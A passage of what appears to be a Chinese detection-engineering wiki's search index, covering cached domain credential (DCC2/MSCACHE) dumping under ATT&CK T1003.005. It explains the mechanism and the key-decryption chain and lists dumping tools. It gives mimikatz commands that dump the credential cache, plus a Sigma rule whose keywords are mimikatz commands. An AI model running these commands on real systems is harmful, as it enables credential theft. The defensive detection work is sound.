u7528\u57df\u8d26\u6237\u767b\u5f55\u8fd9\u53f0\u529e\u516c\u7535\u8111\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u8fd9\u53f0\u7535\u8111\u6839\u672c\u65e0\u6cd5\u8fde\u63a5\u5230\u57df\u63a7\u7684\u65f6\u5019\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u57df\u8d26\u6237\u767b\u9646\u8fd9\u53f0\u7535\u8111\uff0c\u90a3\u8fd9\u4e2a\u65f6\u5019\u662f\u7531\u8c01\u6765\u8d1f\u8d23\u9a8c\u8bc1\u4f60\u8f93\u5165\u7684\u57df\u8d26\u53f7\u5bc6\u7801\u662f\u5426\u6b63\u786e\u5462\uff1f\u5c31\u662fMSCACHE\uff01\u3002 MSCACHE\u5de5\u4f5c\u539f\u7406\u4ecb\u7ecd \u5f53\u7ec8\u7aef\u6216\u5176\u4ed6\u8bbe\u5907\u53ef\u4ee5\u8fde\u4e0a\u57df\u63a7\u7684\u65f6\u5019\uff0c\u4f60\u7528\u57df\u8d26\u53f7\u53bb\u767b\u9646\u8fd9\u53f0\u7ec8\u7aef\u6216\u5176\u4ed6\u8bbe\u5907\uff0c\u5728\u767b\u9646\u6210\u529f\u540e\uff08\u57df\u63a7\u9a8c\u8bc1\u4e86\u4f60\u7684\u8eab\u4efd\u540e\uff09\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5c06\u4f60\u7684\u6388\u6743\u51ed\u636e\u4ee5\u53ca\u6388\u6743\u4fe1\u606f\u4fdd\u5b58\u5728\u6ce8\u518c\u8868\u91cc\u9762\u3002\u9ed8\u8ba4\u662f\u4fdd\u5b58 10 \u4e2a\u6388\u6743\u51ed\u636e\uff08\u53ef\u4ee5\u5bf9\u8fd9\u4e2a\u503c\u8fdb\u884c\u66f4\u6539\uff09\u3002\u5f53\u88ab\u4fdd\u5b58\u7684\u6388\u6743\u51ed\u636e\u5df2\u7ecf\u8d85\u8fc7 10 \u4e2a\u7684\u8bdd\uff0c\u65b0\u7684\u6388\u6743\u51ed\u636e\u4f1a\u8986\u76d6\u6389\u8001\u7684\u6388\u6743\u51ed\u636e\u3002 \u6388\u6743\u51ed\u636e\u88ab\u7f13\u5b58\u5728\u6ce8\u518c\u8868\u91cc\u7684\u8fd9\u4e9b\u7528\u6237\uff0c\u5728\u673a\u5668\u8fde\u4e0d\u4e0a\u57df\u63a7\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u767b\u9646\u8fd9\u53f0\u673a\u5668\uff08\u53ea\u80fd\u4ea4\u4e92\u5f0f\u767b\u9646\uff0c\u6bd4\u5982\u63a7\u5236\u53f0\u6216\u8fdc\u7a0b\u684c\u9762\u3002\u8fdc\u7a0b\u684c\u9762\u7684\u65f6\u5019\u8981\u6ce8\u610f\uff0c\u4e0d\u80fd\u4f7f\u7528\u5e26\u6709 NLA\uff08\u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1 \uff09 \u529f\u80fd\u7684 RDP \u5ba2\u6237\u7aef\uff0c\u8981\u7528\u8001\u7684\u6bd4\u5982 XP \u4e0a\u9ed8\u8ba4 RDP \u5ba2\u6237\u7aef\uff09\uff0c\u4f46\u662f\u6ca1\u6709\u88ab\u7f13\u5b58\u5728\u6ce8\u518c\u8868\u91cc\u7684\u7528\u6237\u662f\u65e0\u6cd5\u767b\u9646\u7684\u3002 \u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1 (NLA) \u5728\u8fd9\u91cc\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0bNLA\u662f\u4ec0\u4e48\uff1f \u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1 (NLA) \u662f\u4e00\u9879\u65b0\u7684\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\uff0c\u5373\u5728\u60a8\u5efa\u7acb\u5b8c\u6574\u7684\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u524d\u5c31\u5b8c\u6210\u4e86\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u5e76\u663e\u793a\u767b\u5f55\u5c4f\u5e55\u3002\u5b83\u662f\u4e00\u9879\u66f4\u52a0\u5b89\u5168\u7684\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\uff0c\u53ef\u4ee5\u9632\u6b62\u8fdc\u7a0b\u8ba1\u7b97\u673a\u53d7\u5230\u9ed1\u5ba2\u6216\u6076\u610f\u8f6f\u4ef6\u7684\u653b\u51fb\u3002NLA \u7684\u4f18\u70b9\u662f\uff1a \u6700\u521d\u53ea\u9700\u8981\u5c11\u91cf\u7684\u8fdc\u7a0b\u8ba1\u7b97\u673a\u8d44\u6e90\u3002\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u524d\uff0c\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4ec5\u4f7f\u7528\u6709\u9650\u7684\u8d44\u6e90\uff0c\u800c\u4e0d\u662f\u50cf\u5728\u5148\u524d\u7248\u672c\u4e2d\u542f\u52a8\u6574\u4e2a\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u3002 \u53ef\u4ee5\u901a\u8fc7\u964d\u4f4e\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff08\u5c1d\u8bd5\u9650\u5236\u6216\u963b\u6b62\u8bbf\u95ee Internet\uff09\u7684\u98ce\u9669\u63d0\u4f9b\u66f4\u9ad8\u7684\u5b89\u5168\u4fdd\u969c\u3002 \u4f7f\u7528\u8fdc\u7a0b\u8ba1\u7b97\u673a\u8eab\u4efd\u9a8c\u8bc1\u53ef\u4ee5\u9632\u6b62\u6211\u4eec\u8fde\u63a5\u5230\u56e0\u6076\u610f\u76ee\u7684\u800c\u5b89\u88c5\u7684\u8fdc\u7a0b\u8ba1\u7b97\u673a\u3002 MSCACHE \u89e3\u5bc6 - Bootkey, LSA Key, NLKM Key \u6240\u4ee5\uff0c\u6211\u4eec\u8981\u60f3\u89e3\u5bc6 MSCACHE\uff0c\u8981\u8fdb\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff1a \u5f97\u5230 bootkey \u5229\u7528 bootkey \u89e3\u5bc6 LSA Key \u5229\u7528 LSA Key \u89e3\u5bc6 NLKM Key \u5229\u7528 NLKM Key \u89e3\u5bc6 MSCACHE \u4ee5\u4e0a\u5185\u5bb9\u5f15\u7528\u81ea\uff1a https://baijiahao.baidu.com/s?id=1611304657392579351 \u6d4b\u8bd5\u6848\u4f8b \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aMSCACHE \u4fdd\u5b58\u7684\u662f DCC hash\uff0c\u800c\u5e76\u4e0d\u662f NTLM \u7684 HASH\u3002\u6240\u4ee5\u4f60\u5bfc\u51fa\u7684\u57df\u7f13\u5b58\u7684 hash \u662f\u4e0d\u80fd\u7528\u4e8e PTH \u7684\uff0c\u53ea\u80fd\u7528\u6765\u7834\u89e3\u3002\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5de5\u5177\u901a\u8fc7\u5185\u5b58\u6280\u672f\u68c0\u7d22SAM\u6587\u4ef6\uff1a pwdumpx.exe gsecdump mimikatz cachedump ...... \u6216\u8005\uff0c\u53ef\u4ee5\u4f7f\u7528reg.exe\u4eceRegistry\u6536\u96c6\u51ed\u636e\uff0c\u5728\u672c\u5730\u4f7f\u7528Creddump7\u8fdb\u884c\u7834\u89e3\u54c8\u5e0c\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u573a\u666f\uff1a\u653b\u51fb\u8005\u5229\u7528mimikatz\u8bfb\u53d6mscash\u5bc6\u7801\u54c8\u5e0c mimikatz.exe \"privilege::debug\" \"token::whoami\" \"token::elevate\" \"LSADUMP::Cache\" \u6ce8\u610f\u6743\u9650\u95ee\u9898\uff08administrator\uff09\uff0c\u5982\u679c\u6743\u9650\u5b58\u5728\u95ee\u9898\u9700\u8981\u6267\u884c\u4ee5\u4e0a\u547d\u4ee4\u3002\u5982\u679c\u6743\u9650\u6ca1\u6709\u95ee\u9898\u5efa\u8bae\u6267\u884c\u4ee5\u4e0b\u547d\u540d\uff1a mimikatz.exe \"privilege::debug\" \"LSADUMP::Cache\" \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Mimikatz\u4f7f\u7528 tags: - attack.s0002 - attack.t1003 - attack.lateral_movement logsource: product: windows detection: keywords: Message: - \"* mimikatz *\" - \"* mimilib *\" - \"* <3 eo.oe *\" - \"* eo.oe.kiwi *\" - \"* privilege::debug *\" - \"* sekurlsa::logonpasswords *\" - \"* lsadump::sam *\" - \"* mimidrv.sys *\" - \"* p::d *\" - \"* s::l *\" condition: keywords falsepositives: - Naughty administrators - Penetration test level: critical \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003-005 https://attack.mitre.org/techniques/T1003/005 \u4f60\u5e76\u4e0d\u61c2 Mimikatz Part 2 - MSCACHE https://baijiahao.baidu.com/s?id=1611304657392579351 DCC2\u7b97\u6cd5\u4ecb\u7ecd https://openwall.info/wiki/john/MSCash2 Windows\u5bc6\u7801\u7f13\u5b58\uff08mscache / mscash\uff09v2 https://www.jedge.com/wordpress/windows-password-cache-mscache-mscash-v2/ \u8f6c\u50a8\u548c\u7834\u89e3mscash-\u7f13\u5b58\u7684\u57df\u51ed\u636e https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials","title":"T1003-005-win-DCC2-mimikatz\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#t1003-005-win-dcc2-mimikatz","text":"","title":"T1003-005-win-DCC2-mimikatz\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u7f13\u5b58\u7684\u57df\u51ed\u636e\uff0c\u8be5\u51ed\u636e\u7528\u4e8e\u5728\u57df\u63a7\u5236\u5668\u4e0d\u53ef\u7528\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u5728Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u4e0a\uff0c\u54c8\u5e0c\u683c\u5f0f\u4e3aDCC2\uff08\u57df\u7f13\u5b58\u51ed\u636e\u7248\u672c2\uff09\u54c8\u5e0c\uff0c\u4e5f\u79f0\u4e3aMS-Cache v2\u54c8\u5e0c\u3002\u9ed8\u8ba4\u7f13\u5b58\u51ed\u636e\u7684\u6570\u91cf\u5404\u4e0d\u76f8\u540c\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7cfb\u7edf\u90fd\u53ef\u4ee5\u66f4\u6539\u3002\u8be5\u6563\u5217\u4e0d\u5141\u8bb8\u901a\u8fc7\u6563\u5217\u6837\u5f0f\u7684\u653b\u51fb\uff0c\u800c\u662f\u9700\u8981\u4f7f\u7528\u5bc6\u7801\u7834\u89e3\u6765\u6062\u590d\u7eaf\u6587\u672c\u5bc6\u7801\u3002 \u901a\u8fc7SYSTEM\u8bbf\u95ee\uff0c\u53ef\u4ee5\u4f7f\u7528\u8bf8\u5982Mimikatz\uff0cReg\u548csecretsdump.py\u4e4b\u7c7b\u7684\u5de5\u5177/\u5b9e\u7528\u7a0b\u5e8f\u6765\u63d0\u53d6\u7f13\u5b58\u7684\u51ed\u636e\u3002 \u6ce8\u610f\uff1aWindows Vista\u7684\u7f13\u5b58\u51ed\u636e\u662f\u4f7f\u7528PBKDF2\u6d3e\u751f\u7684","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#dcc2domain-cached-credentials-version-2","text":"Domain Cached Credentials \u7b80\u79f0 DDC\u57df\u7f13\u5b58\u51ed\u636e\uff0c\u662f\u7f13\u5b58\u7684\u57df\u767b\u5f55\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u672c\u5730\u5b58\u50a8\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u7684windows\u6ce8\u518c\u8868\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u952e\u4e2d\u7684regedit\uff08\u4ee5SYSTEM\u7279\u6743\u8fd0\u884c\uff09\u6765\u67e5\u770b\u3002 HKEY_LOCAL_MACHINE\\SECURITY\\Cache \u968f\u7740Windows Vista\u64cd\u4f5c\u7cfb\u7edf\u7684\u53d1\u5e03\uff0cMicrosoft\u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u54c8\u5e0c\u7b97\u6cd5\u6765\u751f\u6210\u8fd9\u4e9b\u57df\u7f13\u5b58\u7684\u51ed\u636e\u3002\u8fd9\u79cd\u65b0\u7b97\u6cd5\uff08\u5373DCC2\uff09\u5c06\u5bc6\u7801\u731c\u6d4b\u653b\u51fb\u7684\u6210\u672c\u63d0\u9ad8\u4e86\u51e0\u4e2a\u6570\u91cf\u7ea7\u3002 DCC2\uff08\u57df\u7f13\u5b58\u51ed\u636e\u7248\u672c2\uff09\uff0cWindows Vista\u548c\u66f4\u65b0\u7248\u672c\u7684\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u6b64\u7b97\u6cd5\u6765\u7f13\u5b58\u548c\u9a8c\u8bc1\u76f8\u5173\u670d\u52a1\u5668\uff08\u57df\u63a7\uff09\u4e0d\u53ef\u7528\u65f6\u7684\u8fdc\u7a0b\u51ed\u636e\u3002\u5b83\u6709\u8bb8\u591a\u5176\u4ed6\u540d\u79f0\uff0c\u5305\u62ec\u201c mscache2\u201d\u548c\u201c mscash2\u201d\uff08Microsoft CAched haSH\uff09\u3002\u5b83\u53d6\u4ee3\u4e86Windows \u65e9\u671f\u7248\u672c\u4e2d\u4f7f\u7528\u7684\u8f83\u5f31\u7684msdcc v1\u54c8\u5e0c\u3002\u4ece\u5b89\u5168\u89d2\u5ea6\u6765\u770b\uff0c\u5b83\u5e76\u4e0d\u662f\u7279\u522b\u5f31\uff0c\u4f46\u662f\u7531\u4e8e\u5b83\u4f7f\u7528\u4e86\u7528\u6237\u540d\u4f5c\u4e3a\u76d0\uff0c\u56e0\u6b64\u9664\u4e86\u9a8c\u8bc1\u73b0\u6709\u7684\u7f13\u5b58\u51ed\u636e\u4e4b\u5916\uff0c\u4e0d\u5e94\u5c06\u5176\u7528\u4e8e\u4efb\u4f55\u5176\u4ed6\u7528\u9014\u3002\u7b80\u5355\u6765\u8bf4\uff1a\u5b83\u662f\u7f13\u5b58\u5728\u64cd\u4f5c\u7cfb\u7edf\u672c\u5730\u6ce8\u518c\u8868\u4e2d\u7684\u57df\u51ed\u636e+\u57df\u6388\u6743\u4fe1\u606f\uff0c\u540e\u9762\u7b80\u79f0\u6388\u6743\u51ed\u636e\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff1a\u4f60\u7684\u4e2a\u4eba\u529e\u516c\u7535\u8111\u52a0\u5165\u4e86\u516c\u53f8\u7684\u529e\u516c\u57df\uff0c\u4f60\u4e00\u76f4\u4f7f\u7528\u57df\u8d26\u6237\u8fdb\u884c\u767b\u5f55\uff0c\u800c\u4e0d\u662f\u672c\u5730\u8d26\u6237\u767b\u5f55\u3002\u4f60\u5229\u7528\u57df\u8d26\u6237\u767b\u5f55\u65f6\u6240\u8f93\u5165\u7684\u8d26\u6237\u5bc6\u7801\u7531\u57df\u63a7\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5f53\u57df\u63a7\u9a8c\u8bc1\u6210\u529f\u540e\u4f60\u53ef\u4ee5\u767b\u5f55\u8fd9\u53f0\u529e\u516c\u7535\u8111\uff1b\u4f46\u5f53\u4f60\u7684\u4e2a\u4eba\u529e\u516c\u7535\u8111\u5904\u4e8e\u65ad\u7f51\u6216\u8005\u5728\u5176\u4ed6\u5730\u65b9\u529e\u516c\uff08\u975e\u516c\u53f8\u529e\u516c\u57df\u73af\u5883\uff09\u65f6\uff0c\u4f60\u4f9d\u7136\u53ef\u4ee5\u4f7f\u7528\u57df\u8d26\u6237\u767b\u5f55\u8fd9\u53f0\u529e\u516c\u7535\u8111\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u8fd9\u53f0\u7535\u8111\u6839\u672c\u65e0\u6cd5\u8fde\u63a5\u5230\u57df\u63a7\u7684\u65f6\u5019\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u57df\u8d26\u6237\u767b\u9646\u8fd9\u53f0\u7535\u8111\uff0c\u90a3\u8fd9\u4e2a\u65f6\u5019\u662f\u7531\u8c01\u6765\u8d1f\u8d23\u9a8c\u8bc1\u4f60\u8f93\u5165\u7684\u57df\u8d26\u53f7\u5bc6\u7801\u662f\u5426\u6b63\u786e\u5462\uff1f\u5c31\u662fMSCACHE\uff01\u3002","title":"DCC2\uff08Domain Cached Credentials version 2\uff09"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#mscache","text":"\u5f53\u7ec8\u7aef\u6216\u5176\u4ed6\u8bbe\u5907\u53ef\u4ee5\u8fde\u4e0a\u57df\u63a7\u7684\u65f6\u5019\uff0c\u4f60\u7528\u57df\u8d26\u53f7\u53bb\u767b\u9646\u8fd9\u53f0\u7ec8\u7aef\u6216\u5176\u4ed6\u8bbe\u5907\uff0c\u5728\u767b\u9646\u6210\u529f\u540e\uff08\u57df\u63a7\u9a8c\u8bc1\u4e86\u4f60\u7684\u8eab\u4efd\u540e\uff09\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5c06\u4f60\u7684\u6388\u6743\u51ed\u636e\u4ee5\u53ca\u6388\u6743\u4fe1\u606f\u4fdd\u5b58\u5728\u6ce8\u518c\u8868\u91cc\u9762\u3002\u9ed8\u8ba4\u662f\u4fdd\u5b58 10 \u4e2a\u6388\u6743\u51ed\u636e\uff08\u53ef\u4ee5\u5bf9\u8fd9\u4e2a\u503c\u8fdb\u884c\u66f4\u6539\uff09\u3002\u5f53\u88ab\u4fdd\u5b58\u7684\u6388\u6743\u51ed\u636e\u5df2\u7ecf\u8d85\u8fc7 10 \u4e2a\u7684\u8bdd\uff0c\u65b0\u7684\u6388\u6743\u51ed\u636e\u4f1a\u8986\u76d6\u6389\u8001\u7684\u6388\u6743\u51ed\u636e\u3002 \u6388\u6743\u51ed\u636e\u88ab\u7f13\u5b58\u5728\u6ce8\u518c\u8868\u91cc\u7684\u8fd9\u4e9b\u7528\u6237\uff0c\u5728\u673a\u5668\u8fde\u4e0d\u4e0a\u57df\u63a7\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u767b\u9646\u8fd9\u53f0\u673a\u5668\uff08\u53ea\u80fd\u4ea4\u4e92\u5f0f\u767b\u9646\uff0c\u6bd4\u5982\u63a7\u5236\u53f0\u6216\u8fdc\u7a0b\u684c\u9762\u3002\u8fdc\u7a0b\u684c\u9762\u7684\u65f6\u5019\u8981\u6ce8\u610f\uff0c\u4e0d\u80fd\u4f7f\u7528\u5e26\u6709 NLA\uff08\u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1 \uff09 \u529f\u80fd\u7684 RDP \u5ba2\u6237\u7aef\uff0c\u8981\u7528\u8001\u7684\u6bd4\u5982 XP \u4e0a\u9ed8\u8ba4 RDP \u5ba2\u6237\u7aef\uff09\uff0c\u4f46\u662f\u6ca1\u6709\u88ab\u7f13\u5b58\u5728\u6ce8\u518c\u8868\u91cc\u7684\u7528\u6237\u662f\u65e0\u6cd5\u767b\u9646\u7684\u3002","title":"MSCACHE\u5de5\u4f5c\u539f\u7406\u4ecb\u7ecd"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#nla","text":"\u5728\u8fd9\u91cc\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0bNLA\u662f\u4ec0\u4e48\uff1f \u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1 (NLA) \u662f\u4e00\u9879\u65b0\u7684\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\uff0c\u5373\u5728\u60a8\u5efa\u7acb\u5b8c\u6574\u7684\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u524d\u5c31\u5b8c\u6210\u4e86\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u5e76\u663e\u793a\u767b\u5f55\u5c4f\u5e55\u3002\u5b83\u662f\u4e00\u9879\u66f4\u52a0\u5b89\u5168\u7684\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\uff0c\u53ef\u4ee5\u9632\u6b62\u8fdc\u7a0b\u8ba1\u7b97\u673a\u53d7\u5230\u9ed1\u5ba2\u6216\u6076\u610f\u8f6f\u4ef6\u7684\u653b\u51fb\u3002NLA \u7684\u4f18\u70b9\u662f\uff1a \u6700\u521d\u53ea\u9700\u8981\u5c11\u91cf\u7684\u8fdc\u7a0b\u8ba1\u7b97\u673a\u8d44\u6e90\u3002\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u524d\uff0c\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4ec5\u4f7f\u7528\u6709\u9650\u7684\u8d44\u6e90\uff0c\u800c\u4e0d\u662f\u50cf\u5728\u5148\u524d\u7248\u672c\u4e2d\u542f\u52a8\u6574\u4e2a\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u3002 \u53ef\u4ee5\u901a\u8fc7\u964d\u4f4e\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff08\u5c1d\u8bd5\u9650\u5236\u6216\u963b\u6b62\u8bbf\u95ee Internet\uff09\u7684\u98ce\u9669\u63d0\u4f9b\u66f4\u9ad8\u7684\u5b89\u5168\u4fdd\u969c\u3002 \u4f7f\u7528\u8fdc\u7a0b\u8ba1\u7b97\u673a\u8eab\u4efd\u9a8c\u8bc1\u53ef\u4ee5\u9632\u6b62\u6211\u4eec\u8fde\u63a5\u5230\u56e0\u6076\u610f\u76ee\u7684\u800c\u5b89\u88c5\u7684\u8fdc\u7a0b\u8ba1\u7b97\u673a\u3002","title":"\u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1 (NLA)"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#mscache-bootkey-lsa-key-nlkm-key","text":"\u6240\u4ee5\uff0c\u6211\u4eec\u8981\u60f3\u89e3\u5bc6 MSCACHE\uff0c\u8981\u8fdb\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff1a \u5f97\u5230 bootkey \u5229\u7528 bootkey \u89e3\u5bc6 LSA Key \u5229\u7528 LSA Key \u89e3\u5bc6 NLKM Key \u5229\u7528 NLKM Key \u89e3\u5bc6 MSCACHE \u4ee5\u4e0a\u5185\u5bb9\u5f15\u7528\u81ea\uff1a https://baijiahao.baidu.com/s?id=1611304657392579351","title":"MSCACHE \u89e3\u5bc6 - Bootkey, LSA Key, NLKM Key"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","text":"\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aMSCACHE \u4fdd\u5b58\u7684\u662f DCC hash\uff0c\u800c\u5e76\u4e0d\u662f NTLM \u7684 HASH\u3002\u6240\u4ee5\u4f60\u5bfc\u51fa\u7684\u57df\u7f13\u5b58\u7684 hash \u662f\u4e0d\u80fd\u7528\u4e8e PTH \u7684\uff0c\u53ea\u80fd\u7528\u6765\u7834\u89e3\u3002\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5de5\u5177\u901a\u8fc7\u5185\u5b58\u6280\u672f\u68c0\u7d22SAM\u6587\u4ef6\uff1a pwdumpx.exe gsecdump mimikatz cachedump ...... \u6216\u8005\uff0c\u53ef\u4ee5\u4f7f\u7528reg.exe\u4eceRegistry\u6536\u96c6\u51ed\u636e\uff0c\u5728\u672c\u5730\u4f7f\u7528Creddump7\u8fdb\u884c\u7834\u89e3\u54c8\u5e0c\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","text":"windows sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","text":"\u573a\u666f\uff1a\u653b\u51fb\u8005\u5229\u7528mimikatz\u8bfb\u53d6mscash\u5bc6\u7801\u54c8\u5e0c mimikatz.exe \"privilege::debug\" \"token::whoami\" \"token::elevate\" \"LSADUMP::Cache\" \u6ce8\u610f\u6743\u9650\u95ee\u9898\uff08administrator\uff09\uff0c\u5982\u679c\u6743\u9650\u5b58\u5728\u95ee\u9898\u9700\u8981\u6267\u884c\u4ee5\u4e0a\u547d\u4ee4\u3002\u5982\u679c\u6743\u9650\u6ca1\u6709\u95ee\u9898\u5efa\u8bae\u6267\u884c\u4ee5\u4e0b\u547d\u540d\uff1a mimikatz.exe \"privilege::debug\" \"LSADUMP::Cache\"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","text":"title: Mimikatz\u4f7f\u7528 tags: - attack.s0002 - attack.t1003 - attack.lateral_movement logsource: product: windows detection: keywords: Message: - \"* mimikatz *\" - \"* mimilib *\" - \"* <3 eo.oe *\" - \"* eo.oe.kiwi *\" - \"* privilege::debug *\" - \"* sekurlsa::logonpasswords *\" - \"* lsadump::sam *\" - \"* mimidrv.sys *\" - \"* p::d *\" - \"* s::l *\" condition: keywords falsepositives: - Naughty administrators - Penetration test level: critical","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","text":"MITRE-ATT&CK-T1003-005 https://attack.mitre.org/techniques/T1003/005 \u4f60\u5e76\u4e0d\u61c2 Mimikatz Part 2 - MSCACHE https://baijiahao.baidu.com/s?id=1611304657392579351 DCC2\u7b97\u6cd5\u4ecb\u7ecd https://openwall.info/wiki/john/MSCash2 Windows\u5bc6\u7801\u7f13\u5b58\uff08mscache / mscash\uff09v2 https://www.jedge.com/wordpress/windows-password-cache-mscache-mscash-v2/ \u8f6c\u50a8\u548c\u7834\u89e3mscash-\u7f13\u5b58\u7684\u57df\u51ed\u636e https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","text":"T1003-006-windows-\u57fa\u4e8eDCsync\u51ed\u8bc1\u83b7\u53d6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 